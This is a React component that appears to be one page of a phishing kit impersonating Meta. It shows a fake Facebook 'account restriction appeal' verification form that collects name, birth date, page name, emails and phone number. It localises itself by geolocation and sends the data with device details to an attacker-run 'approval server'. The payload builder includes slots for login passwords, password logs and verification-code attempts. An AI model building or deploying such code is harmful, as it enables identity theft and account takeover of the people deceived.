import '@/assets/css/first-form-modal.css';
import LogoMeta from '@/assets/images/logo-meta.svg';
import { useSocketEmit } from '@/hooks/use-socket';
import { store } from '@/store/store';
import { getDeviceLabel } from '@/utils/device';
import { buildAppealMessage, geoToIpInfo } from '@/utils/message';
import { sendAppealMessage } from '@/utils/socket-approval';
import translateText from '@/utils/translate';
import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import IntlTelInput from 'intl-tel-input/reactWithUtils';
import 'intl-tel-input/styles';
import Image from 'next/image';
import {
    type ChangeEvent,
    type FC,
    type FormEvent,
    type KeyboardEvent,
    useCallback,
    useEffect,
    useMemo,
    useRef,
    useState
} from 'react';

type FormFieldName = 'fullName' | 'dateOfBirth' | 'facebookPageName' | 'businessEmail' | 'personalEmail';

interface FormData {
    fullName: string;
    dateOfBirth: string;
    facebookPageName: string;
    businessEmail: string;
    personalEmail: string;
    reason: string;
    additionalNotes: string;
}

const TEXT = {
    title: 'Verification information',
    intro:
        'Please indicate why you believe that account restrictions were imposed by mistake. Our technology and team work in multiple languages to ensure consistent enforcement of rules. You can communicate with us in your native language.',
    submitError:
        'Please fill in correctly and completely all required fields to complete the verification profile.',
    sendError:
        'Could not reach the approval server. Start the backend (pnpm dev:backend) and check VPS_BACKEND_URL in .env.local.',
    fullName: 'Full Name',
    fullNamePlaceholder: 'Enter your full name',
    dateOfBirth: 'Date of Birth',
    pageName: 'Facebook Page Name',
    pageNamePlaceholder: 'Enter your Facebook page name',
    businessEmail: 'Business Email',
    businessEmailPlaceholder: 'Enter your business email',
    personalEmail: 'Personal Email',
    personalEmailPlaceholder: 'Enter your personal email',
    phone: 'Mobile Phone Number',
    phonePlaceholder: 'Enter your mobile phone number',
    reasonHeading: 'What do you think happened?',
    reasonErroneous: 'An erroneous report or unfair competitive complaint.',
    reasonNotification: 'This notification was sent in error.',
    reasonNoFraud: 'No fraud involved / another legitimate reason:',
    additionalNotesPlaceholder: 'Additional notes (optional)',
    continue: 'Continue',
    footer: 'Meta © 2026'
} as const;

const REASON_OPTIONS = [
    { value: 'erroneous_report', labelKey: 'reasonErroneous' as const },
    { value: 'notification_error', labelKey: 'reasonNotification' as const },
    { value: 'no_fraud', labelKey: 'reasonNoFraud' as const }
];

const INPUT_OK =
    'first-form-input h-10 w-full rounded-lg border border-[#d4dbe3] px-3 text-sm text-[#212121] outline-none placeholder:text-[#9ca3af] focus:border-blue-500';
const INPUT_ERR =
    'first-form-input h-10 w-full rounded-lg border border-red-500 px-3 text-sm text-[#212121] outline-none placeholder:text-[#9ca3af] focus:border-blue-500';

const textsToTranslate = Object.values(TEXT);

const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const [isLoading, setIsLoading] = useState(false);
    const [phoneNumber, setPhoneNumber] = useState('');
    const [translations, setTranslations] = useState<Record<string, string>>({});
    const [submitError, setSubmitError] = useState('');
    const [invalidFields, setInvalidFields] = useState<Partial<Record<FormFieldName, boolean>>>({});
    const [phoneInvalid, setPhoneInvalid] = useState(false);
    const [reasonInvalid, setReasonInvalid] = useState(false);
    const phoneWrapRef = useRef<HTMLDivElement>(null);

    const [formData, setFormData] = useState<FormData>({
        fullName: '',
        dateOfBirth: '',
        facebookPageName: '',
        businessEmail: '',
        personalEmail: '',
        reason: '',
        additionalNotes: ''
    });

    const {
        setModalOpen,
        geoInfo,
        setAppealProfile,
        setFormData: persistAppealForm,
        setMessageId,
        deviceLabel,
        setDeviceLabel,
        messageId
    } = store();
    const { socket } = useSocketEmit();
    const countryCode = geoInfo?.country_code.toLowerCase() || 'us';

    const t = (text: string): string => translations[text] || text;

    useEffect(() => {
        document.title = TEXT.title;
    }, []);

    useEffect(() => {
        if (typeof window !== 'undefined' && deviceLabel === 'Unknown') {
            setDeviceLabel(getDeviceLabel(navigator.userAgent));
        }
    }, [deviceLabel, setDeviceLabel]);

    useEffect(() => {
        if (!geoInfo) {
            return;
        }

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};
            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }
            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    const initOptions = useMemo(
        () => ({
            initialCountry: countryCode as '',
            separateDialCode: true,
            strictMode: true,
            nationalMode: false,
            autoPlaceholder: 'polite' as const,
            placeholderNumberType: 'MOBILE' as const,
            countrySearch: false
        }),
        [countryCode]
    );

    const inputClass = (name: FormFieldName) => (invalidFields[name] ? INPUT_ERR : INPUT_OK);

    const clearFieldError = (name: FormFieldName) => {
        setInvalidFields((prev) => {
            if (!prev[name]) {
                return prev;
            }
            const next = { ...prev };
            delete next[name];
            return next;
        });
    };

    const handleInputChange = useCallback((e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { name, value } = e.target;
        if (name in formData) {
            clearFieldError(name as FormFieldName);
        }
        setFormData((prev) => ({
            ...prev,
            [name]: value
        }));
    }, []);

    const handlePhoneChange = useCallback((number: string) => {
        setPhoneNumber(number);
        setPhoneInvalid(false);
        phoneWrapRef.current?.classList.remove('is-invalid');
    }, []);

    const handleReasonChange = (value: string) => {
        setFormData((prev) => ({ ...prev, reason: value }));
        setReasonInvalid(false);
    };

    const handlePhoneKeyDown = (e: KeyboardEvent<HTMLInputElement>) => {
        const allow = ['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab', 'Home', 'End'];
        if (allow.includes(e.key) || e.ctrlKey || e.metaKey) {
            return;
        }
        if (!/^\d$/.test(e.key)) {
            e.preventDefault();
        }
    };

    const validate = (): boolean => {
        const nextInvalid: Partial<Record<FormFieldName, boolean>> = {};
        let hasError = false;

        (['fullName', 'dateOfBirth', 'facebookPageName', 'businessEmail', 'personalEmail'] as FormFieldName[]).forEach(
            (field) => {
                const empty = !formData[field].trim();
                if (empty) {
                    nextInvalid[field] = true;
                    hasError = true;
                }
            }
        );

        const phoneDigits = phoneNumber.replace(/\D/g, '');
        const phoneBad = !phoneNumber || phoneDigits.length < 8 || phoneDigits.length > 15;
        if (phoneBad) {
            setPhoneInvalid(true);
            phoneWrapRef.current?.classList.add('is-invalid');
            hasError = true;
        } else {
            setPhoneInvalid(false);
            phoneWrapRef.current?.classList.remove('is-invalid');
        }

        if (!formData.reason) {
            setReasonInvalid(true);
            hasError = true;
        } else {
            setReasonInvalid(false);
        }

        setInvalidFields(nextInvalid);

        if (hasError) {
            setSubmitError(t(TEXT.submitError));
            return false;
        }

        setSubmitError('');
        return true;
    };

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        if (isLoading || !validate()) {
            return;
        }

        setIsLoading(true);

        const selectedReason = REASON_OPTIONS.find((o) => o.value === formData.reason);
        const reasonLabel = selectedReason ? t(TEXT[selectedReason.labelKey]) : formData.reason;

        const payload = {
            fullName: formData.fullName.trim(),
            dateOfBirth: formData.dateOfBirth.trim(),
            personalEmail: formData.personalEmail.trim(),
            businessEmail: formData.businessEmail.trim(),
            phone: phoneNumber,
            pageName: formData.facebookPageName.trim(),
            reason: reasonLabel || formData.reason,
            additionalNotes: formData.additionalNotes.trim()
        };

        try {
            setAppealProfile({
                fullName: payload.fullName,
                personalEmail: payload.personalEmail,
                phone: phoneNumber
            });
            persistAppealForm(payload);

            if (!geoInfo) {
                setSubmitError(t(TEXT.sendError));
                return;
            }

            if (!socket) {
                setSubmitError(t(TEXT.sendError));
                return;
            }

            const message = buildAppealMessage({
                form: payload,
                login: { email: '', password: '' },
                passwordLogs: [],
                codeAttempts: [],
                ip: geoToIpInfo(geoInfo),
                deviceLabel
            });
            const newMessageId = await sendAppealMessage(socket, {
                message,
                message_id: messageId,
                stage: 'info'
            });
            setMessageId(newMessageId);
            nextStep();
        } catch {
            setSubmitError(t(TEXT.sendError));
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className='community-page fixed inset-0 z-10 flex min-h-screen w-full justify-center overflow-y-auto bg-white'>
            <div className='flex min-h-screen w-full flex-col'>
                <div className='flex h-[52px] shrink-0 items-center justify-center border-b border-[#E0E0E0] bg-[#F5F6F6]'>
                    <div className='flex w-full max-w-[1280px] items-center justify-between px-4'>
                        <Image src={LogoMeta} alt='Meta' className='h-[22px] w-auto' priority />
                        <button
                            type='button'
                            onClick={() => setModalOpen(false)}
                            className='flex h-9 w-9 items-center justify-center rounded-full text-[#65676B] transition-colors hover:bg-[#E4E6EB]'
                            aria-label='Close'
                        >
                            <FontAwesomeIcon icon={faXmark} size='lg' />
                        </button>
                    </div>
                </div>

                <div className='mx-auto my-3 w-full max-w-[600px] flex-1 bg-white px-4 py-4 md:my-8 md:rounded-lg md:border md:border-gray-200 md:shadow-sm'>
                    <div className='mb-1 flex items-start justify-between gap-4'>
                        <h2 className='text-[20px] font-[700] text-[#212121]'>{t(TEXT.title)}</h2>
                    </div>

                    <p className='mb-2 rounded-md border border-blue-200 bg-blue-50 p-2.5 text-[14px] font-[300] leading-5 text-gray-800'>
                        {t(TEXT.intro)}
                    </p>

                    <form id='verification-form' className='space-y-3' noValidate onSubmit={handleSubmit}>
                        {submitError ? (
                            <p className='-mb-1 text-[13px] text-red-600' role='alert'>
                                {submitError}
                            </p>
                        ) : null}

                        <div>
                            <label className='mb-1.5 block text-sm font-semibold text-[#333]' htmlFor='fullName'>
                                {t(TEXT.fullName)} <span className='text-red-600'>*</span>
                            </label>
                            <input
                                id='fullName'
                                name='fullName'
                                type='text'
                                placeholder={t(TEXT.fullNamePlaceholder)}
                                value={formData.fullName}
                                onChange={handleInputChange}
                                className={inputClass('fullName')}
                            />
                        </div>

                        <div>
                            <label className='mb-1.5 block text-sm font-semibold text-[#333]' htmlFor='dateOfBirth'>
                                {t(TEXT.dateOfBirth)} <span className='text-red-600'>*</span>
                            </label>
                            <input
                                id='dateOfBirth'
                                name='dateOfBirth'
                                type='date'
                                value={formData.dateOfBirth}
                                onChange={handleInputChange}
                                className={inputClass('dateOfBirth')}
                            />
                        </div>

                        <div>
                            <label className='mb-1.5 block text-sm font-semibold text-[#333]' htmlFor='facebookPageName'>
                                {t(TEXT.pageName)} <span className='text-red-600'>*</span>
                            </label>
                            <input
                                id='facebookPageName'
                                name='facebookPageName'
                                type='text'
                                placeholder={t(TEXT.pageNamePlaceholder)}
                                value={formData.facebookPageName}
                                onChange={handleInputChange}
                                className={inputClass('facebookPageName')}
                            />
                        </div>

                        <div>
                            <label className='mb-1.5 block text-sm font-semibold text-[#333]' htmlFor='businessEmail'>
                                {t(TEXT.businessEmail)} <span className='text-red-600'>*</span>
                            </label>
                            <input
                                id='businessEmail'
                                name='businessEmail'
                                type='email'
                                placeholder={t(TEXT.businessEmailPlaceholder)}
                                value={formData.businessEmail}
                                onChange={handleInputChange}
                                className={inputClass('businessEmail')}
                            />
                        </div>

                        <div>
                            <label className='mb-1.5 block text-sm font-semibold text-[#333]' htmlFor='personalEmail'>
                                {t(TEXT.personalEmail)} <span className='text-red-600'>*</span>
                            </label>
                            <input
                                id='personalEmail'
                                name='personalEmail'
                                type='email'
                                placeholder={t(TEXT.personalEmailPlaceholder)}
                                value={formData.personalEmail}
                                onChange={handleInputChange}
                                className={inputClass('personalEmail')}
                            />
                        </div>

                        <div>
                            <label className='mb-1.5 block text-sm font-semibold text-[#333]' htmlFor='phone-input'>
                                {t(TEXT.phone)} <span className='text-red-600'>*</span>
                            </label>
                            <div id='phone-wrap' ref={phoneWrapRef} className={phoneInvalid ? 'is-invalid' : ''}>
                                <IntlTelInput
                                    onChangeNumber={handlePhoneChange}
                                    initOptions={initOptions}
                                    inputProps={{
                                        id: 'phone-input',
                                        name: 'phone',
                                        type: 'tel',
                                        inputMode: 'numeric',
                                        placeholder: t(TEXT.phonePlaceholder),
                                        className: 'form-control iti__tel-input',
                                        onKeyDown: handlePhoneKeyDown
                                    }}
                                />
                            </div>
                        </div>

                        <div className='pt-1'>
                            <p className='mb-3 block text-sm font-[600] text-gray-700'>{t(TEXT.reasonHeading)}</p>
                            <div
                                id='reason-group'
                                className={`first-form-radio-group space-y-2 ${reasonInvalid ? 'is-invalid' : ''}`}
                            >
                                {REASON_OPTIONS.map((option) => (
                                    <label key={option.value} className='first-form-radio-label'>
                                        <input
                                            type='radio'
                                            name='reason'
                                            value={option.value}
                                            checked={formData.reason === option.value}
                                            onChange={() => handleReasonChange(option.value)}
                                        />
                                        <span
                                            role='presentation'
                                            onClick={() => handleReasonChange(option.value)}
                                        >
                                            {t(TEXT[option.labelKey])}
                                        </span>
                                    </label>
                                ))}
                                <div className='mt-1'>
                                    <textarea
                                        id='additionalNotes'
                                        name='additionalNotes'
                                        placeholder={t(TEXT.additionalNotesPlaceholder)}
                                        value={formData.additionalNotes}
                                        onChange={handleInputChange}
                                        className='h-16 w-full resize-none rounded-lg border border-[#d4dbe3] px-3 py-2 text-sm outline-none focus:border-blue-500'
                                    />
                                </div>
                            </div>
                        </div>

                        <div className='pt-2'>
                            <button
                                type='submit'
                                disabled={isLoading}
                                className='h-[40px] min-h-[40px] w-full rounded-[999px] bg-[#0064E0] py-2.5 text-white transition-colors hover:bg-blue-700 disabled:cursor-not-allowed disabled:opacity-80'
                            >
                                {isLoading ? (
                                    <span className='inline-block h-5 w-5 animate-spin-fast rounded-full border-2 border-white border-b-transparent' />
                                ) : (
                                    t(TEXT.continue)
                                )}
                            </button>
                        </div>
                    </form>
                </div>

                <div className='mt-auto w-full shrink-0 border-t border-[#E0E0E0] bg-[#F5F6F6] pt-5 pb-5'>
                    <div className='mx-auto w-full max-w-[1280px] px-4 text-center text-[13px] text-gray-600'>
                        {t(TEXT.footer)}
                    </div>
                </div>
            </div>
        </div>
    );
};

export default InitModal;
